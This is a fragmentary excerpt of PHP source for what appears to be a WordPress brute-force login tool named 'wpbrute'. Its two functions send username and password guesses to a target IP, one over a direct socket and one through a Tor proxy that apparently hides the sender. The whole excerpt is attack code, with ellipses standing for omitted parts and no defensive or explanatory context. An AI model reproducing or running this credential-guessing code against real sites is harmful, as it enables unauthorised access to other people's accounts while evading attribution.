...
function wpbrute_try($sUser,$sPass,$port) {

	global $socket, $wpbrute;
	$packet_buffer = wpbrute_packet($sUser,$sPass);

	//Make a connection
	$socket = fsockopen($wpbrute['target_ip'], $port);
	if (!$socket) {
...
function wpbrute_try_tor($sUser,$sPass,$port) {
	...
	//Make a connection
	$socket = new Torsocket($wpbrute['target_ip'], $port,false,$wpbrute['proxy_port'],$wpbrute['proxy_ip']);
	if ($socket->error == 1) {
